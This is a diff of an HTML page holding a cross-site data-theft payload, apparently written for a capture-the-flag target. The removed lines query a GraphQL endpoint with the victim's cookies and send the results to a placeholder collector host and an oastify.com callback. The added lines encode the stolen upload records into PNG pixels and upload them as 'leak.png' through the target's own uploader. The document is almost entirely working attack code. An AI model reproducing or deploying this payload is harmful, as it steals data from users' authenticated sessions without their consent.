@@ -2,51 +2,59 @@
 <html>
   <body>
     <script>
-      // The GraphQL query
-      const query = {
-        query: `
-          query {
-            uploads {
-              id
-              filename
-              size
-              uploadDate
-              uploadedBy
-            }
-          }
-        `
-      };
+      (async () => {
+        // 1. Fetch GraphQL data
+        const res = await fetch("http://localhost:1337/graphql", {
+          method: "POST",
+          credentials: "include",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            query: `
+              query {
+                uploads {
+                  id
+                  filename
+                  uploadedBy
+                }
+              }
+            `
+          })
+        });
+      
+        const json = await res.json();
+        const text = JSON.stringify(json);
+      
+        // 2. Encode into a PNG
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        const w = 200;
+        const h = Math.ceil(text.length / w);
+        canvas.width = w;
+        canvas.height = h;
+      
+        for (let i = 0; i < text.length; i++) {
+          const char = text.charCodeAt(i);
+          const x = i % w;
+          const y = Math.floor(i / w);
+          // encode each char in red channel, leave green/blue zero
+          ctx.fillStyle = `rgb(${char},0,0)`;
+          ctx.fillRect(x, y, 1, 1);
+        }
+      
+        // 3. Convert canvas to Blob (PNG)
+        canvas.toBlob(async blob => {
+          const form = new FormData();
+          form.append("file", blob, "leak.png");
+      
+          // 4. Upload using the target's uploader
+          await fetch("http://localhost:1337/upload", {
+            method: "POST",
+            credentials: "include",
+            body: form
+          });
+        }, "image/png");
+      })();
 
-      // Send the GraphQL request using victim's cookies
-      fetch("http://94.237.51.19:48620/graphql", {
-        method: "POST",
-        credentials: "include", // include cookies like connect.sid
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(query)
-      })
-      .then(res => res.json())
-      .then(data => {
-        // Exfiltrate the data to your server
-        fetch("https://YOUR-COLLECTOR-HOST/collect", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(data)
-        });
-      })
-      .catch(err => {
-        // Optional: exfiltrate error for debugging
-        fetch("https://mj9n1did115mrp0c35viicgxzo5ftahz.oastify.com/collect", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ error: err.toString() })
-        });
-      });
     </script>
   </body>
 </html>
